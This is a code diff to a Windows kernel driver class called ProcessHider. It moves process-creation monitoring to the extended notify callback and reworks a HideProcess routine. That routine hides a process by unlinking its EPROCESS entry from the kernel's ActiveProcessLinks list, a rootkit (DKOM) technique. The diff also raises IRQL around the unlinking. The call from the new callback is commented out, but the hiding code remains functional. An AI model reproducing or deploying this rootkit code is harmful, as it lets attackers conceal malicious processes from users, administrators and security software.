@@ -10,7 +10,7 @@ namespace filter
 	NTSTATUS ProcessHider::Register()
 	{
 		ProcessHider::HideOnInitializeOperation();
-		NTSTATUS status = PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)&ProcessHider::HideOnCreateOperation, FALSE);
+		NTSTATUS status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, FALSE);
 
 		if (!NT_SUCCESS(status)) 
 		{
@@ -24,16 +24,21 @@ namespace filter
 		
 	}
 
-	void ProcessHider::HideOnCreateOperation(HANDLE ppid, HANDLE pid, BOOLEAN create)
+	void ProcessHider::HideOnCreateOperation(P_CUSTOM_EPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO create_info)
 	{
-		UNREFERENCED_PARAMETER(ppid);
+		UNREFERENCED_PARAMETER(process);
 		WCHAR msg[500] = { 0 };
 		WCHAR name[500] = { 0 };
 
-		if (create)
+		DebugMessage("Process created with PID %d", (int)pid);
+
+		if (create_info!=NULL)
 		{
-			PEPROCESS process = NULL;
 			PUNICODE_STRING process_name = NULL;
+
+			DebugMessage("Process created with PID %d and name %wZ", (int)pid, create_info->ImageFileName);
+
+			/*
 
 			if (PsLookupProcessByProcessId(pid, &process) != STATUS_SUCCESS)
 			{
@@ -59,21 +64,31 @@ namespace filter
 
 			int mem_size = (size - (ans+1)) * 2;
 			RtlCopyMemory(name, &process_name->Buffer[ans+1], mem_size);
-			DebugMessage("Process created with PID %p and name length %d, name %S", pid, process_name->Length, name);
-			
+			DebugMessage("Process created with PID %d and name length %d, name %S", (int)pid, process_name->Length, name);
 
+			if (HideProcess(pid) == true)
+			{
+				DebugMessage("Hide oke");
+			}
+			
 			ExFreePool(process_name->Buffer);
-			HideProcess(pid);
+			*/
 		}
 	}
 
 	void ProcessHider::Unload()
 	{
-		PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)&ProcessHider::HideOnCreateOperation, TRUE);
+		PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, TRUE);
 	}
 
-	void ProcessHider::HideProcess(HANDLE pid)
+	bool ProcessHider::IsProcessInHiddenList(PWCHAR process_name)
 	{
+		return false;
+	}
+
+	bool ProcessHider::HideProcess(HANDLE pid)
+	{
+
 		PEPROCESS p_eprocess;
 		P_CUSTOM_EPROCESS cur_p_eprocess, pre_p_eprocess, next_p_eprocess;
 		PLIST_ENTRY pre_p_list_entry_eprocess, next_p_list_entry_eprocess;
@@ -84,6 +99,10 @@ namespace filter
 
 		if (status == STATUS_SUCCESS)
 		{
+			KIRQL  new_irql = DISPATCH_LEVEL;
+			KIRQL old_irql = DISPATCH_LEVEL;
+			KeRaiseIrql(new_irql, &old_irql);
+
 			cur_p_eprocess = (P_CUSTOM_EPROCESS)(PVOID)p_eprocess;
 
 			pre_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Blink;
@@ -92,8 +111,11 @@ namespace filter
 			next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
 			pre_p_eprocess->ActiveProcessLinks.Flink = next_p_list_entry_eprocess;
 			next_p_eprocess->ActiveProcessLinks.Blink = pre_p_list_entry_eprocess;
+			KeLowerIrql(old_irql);
+
+			return true;
 		}
-		return;
+		return false;
 	}
 
 }
